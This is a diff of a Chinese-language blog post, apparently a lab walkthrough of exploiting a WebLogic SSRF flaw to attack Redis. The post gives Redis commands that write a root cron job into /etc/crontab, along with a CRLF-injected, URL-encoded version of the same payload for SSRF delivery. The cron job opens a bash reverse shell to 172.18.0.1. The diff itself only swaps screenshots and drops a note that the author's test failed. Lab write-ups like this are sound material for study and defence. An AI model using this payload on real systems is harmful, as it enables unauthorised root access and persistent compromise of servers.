@@ -42,9 +42,9 @@
 <p>发送三条redis命令，将弹shell脚本写入/etc/crontab：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">set 1 &quot;\n\n\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/172.18.0.1/21 0&gt;&amp;1\n\n\n\n&quot;</div><div class="line">config set dir /etc/</div><div class="line">config set dbfilename crontab</div><div class="line">save</div></pre></td></tr></table></figure>
 <p>进行url编码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.18.0.1%2F21%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa</div></pre></td></tr></table></figure></p>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/w-ssrf5.png" alt=""></p>
-<p>反弹shell（自己测试没有成功的反弹，附上p牛的图吧）</p>
-<p><img src="https://github.com/phith0n/vulhub/raw/master/weblogic/ssrf/5.png" alt=""></p>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/ssrf-w2.png" alt=""></p>
+<p>反弹shell</p>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/ssrf-w.png" alt=""></p>
 <p>最后补充一下，可进行利用的cron有如下几个地方：</p>
 <ul>
 <li>/etc/crontab 这个是肯定的</li>
